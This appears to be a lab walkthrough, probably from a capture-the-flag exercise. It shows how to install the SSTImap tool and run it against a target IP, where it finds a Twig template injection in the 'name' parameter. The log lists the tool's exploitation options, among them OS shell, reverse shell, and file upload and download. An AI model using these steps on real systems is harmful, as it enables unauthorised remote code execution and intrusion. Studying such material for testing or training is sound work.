# Using SSTImap

```text
$ git clone https://github.com/vladko312/SSTImap.git && cd SSTImap
…
Receiving objects: 100% (275/275), 167.55 KiB | 927.00 KiB/s, done.
Resolving deltas: 100% (157/157), done.

$ ve
(venv)

$ pip install -r requirements.txt
…
Installing collected packages: webencodings, argparse, urllib3, six, idna, charset-normalizer, certifi, requests, html5lib, mechanize
Successfully installed argparse-1.4.0 certifi-2025.1.31 charset-normalizer-2.0.12 html5lib-1.1 idna-3.10 mechanize-0.4.10 requests-2.27.1 six-1.17.0 urllib3-1.26.20 webencodings-0.5.1

$ python3 sstimap.py -u http://83.136.248.131:39688
…
[*] Loaded plugins by categories: languages: 5; legacy_engines: 2; engines: 17; generic: 3
[*] Loaded request body types: 4

[*] Scanning url: http://83.136.248.131:39688
[-] Tested parameters appear to be not injectable.

$ python3 sstimap.py -u http://83.136.248.131:39688/index.php?name=x
…
[*] Loaded plugins by categories: languages: 5; legacy_engines: 2; engines: 17; generic: 3
[*] Loaded request body types: 4
[*] Scanning url: http://83.136.248.131:39688/index.php?name=x
…
[+] Twig plugin has confirmed injection with tag '*'
[+] SSTImap identified the following injection point:

  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code

[+] Rerun SSTImap providing one of the following options:
    --interactive                Run SSTImap in interactive mode to switch between exploitation modes without losing progress.
    --os-shell                   Prompt for an interactive operating system shell.
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port.
    --reverse-shell HOST PORT    Send a shell back to the attacker's port.
    --upload LOCAL REMOTE        Upload files to the server.
    --download REMOTE LOCAL      Download remote files.
```